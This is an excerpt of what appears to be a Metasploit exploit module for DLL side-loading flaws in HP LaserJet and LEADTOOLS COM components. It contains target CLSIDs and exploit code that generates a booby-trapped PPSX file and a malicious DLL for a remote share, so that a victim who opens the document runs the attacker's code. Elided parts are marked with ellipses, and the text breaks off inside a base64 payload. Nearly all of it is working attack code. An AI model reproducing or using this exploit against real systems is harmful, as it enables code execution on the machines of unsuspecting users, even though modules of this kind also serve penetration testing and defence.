...
class Metasploit3 < Msf::Exploit::Remote
   ...
   def initialize(info = {})
      super(update_info(info,
         'Name' => 'HP Color LaserJet CM2320 MFP Series multiple DLL 
side loading vulnerabilities',
         'Description' => %q{
            Multiple DLL side loading vulnerabilities were found in 
various COM components.
            These issues can be exploited by loading various these 
components as an embedded
            OLE object. When instantiating a vulnerable object Windows 
will try to load one   
            or more DLLs from the current working directory. If an 
attacker convinces the
            victim to open a specially crafted (Office) document from a 
directory also
            containing the attacker's DLL file, it is possible to 
execute arbitrary code with
            the privileges of the target user. This can potentially 
result in the attacker
         ...
         'References' =>
            [
               ['URL', 
'https://securify.nl/advisory/SFY20150901/leadtools_activex_control_multiple_dll_side_loading_vulnerabilities.html'],
               ['URL', 
'https://securify.nl/advisory/SFY20150902/hp_tocommsg_dll_side_loading_vulnerability.html'],
               ['URL', 
'https://securify.nl/advisory/SFY20150903/hp_laserjet_fax_preview_dll_side_loading_vulnerability.html'],
            ],
         'DefaultOptions' =>
            {
               'EXITFUNC' => 'thread',
                  ...
                  'LEADTOOLS ActiveX control / Windows 7 / Office 2013',
                     {
                        ...
                        'CLSID' => 
"\x00\x00\x11\x00\xBA\xB1\xCE\x11\xAB\xC6\xF5\xB2\xE7\x9D\x9E\x3F"
                     }
               ],
               [
                  'HP ToComMsg / Windows 7 / Office 2013',
                     {
                        ...
                        'CLSID' => 
"\x71\xE0\x7D\x2C\x6D\x0E\xD5\x11\x95\x4B\x00\x10\x83\x02\xE3\xC8"
                     }
               ],
               [
                  'HP LaserJet Fax Preview / Windows 7 / Office 2013',
                     {
                        ...
                        'CLSID' => 
"\xBB\x7C\x86\xCF\x80\x6C\xD3\x11\x93\xB0\x00\x10\x83\x02\xE3\xC8"
                     }
               ],
            ],
         'Privileged' => false,
      ...
      register_options(
         [
            OptString.new('FILENAME', [true, 'The PPSX file', 
'msf.ppsx']),
         ], self.class)
   end
   ...
   def exploit
      ...
      targets.each do |t|
         ...
         dll_path = store_local("exploit.fileformat.#{self.shortname}", 
nil, dll, dll_name)
         print_good("#{dll_name} stored at #{dll_path}, copy it to a 
remote share")

         print_status("Creating the PPSX file...")
         ppsx = get_ppsx(t['CLSID'])
         ppsx_path = store_local("exploit.fileformat.#{self.shortname}", 
nil, ppsx, ppsx_name)
         print_good("#{ppsx_name} stored at #{ppsx_path}, copy it to a 
remote share")
      end
   end
   ...
   def get_ppsx(clsid)
      data = 
Base64.decode64(%Q|UEsDBBQABgAIAAAAIQDgkYqZ2AEAADgNAAATAAgCW0NvbnRlbnRfVHlwZXNdLnht
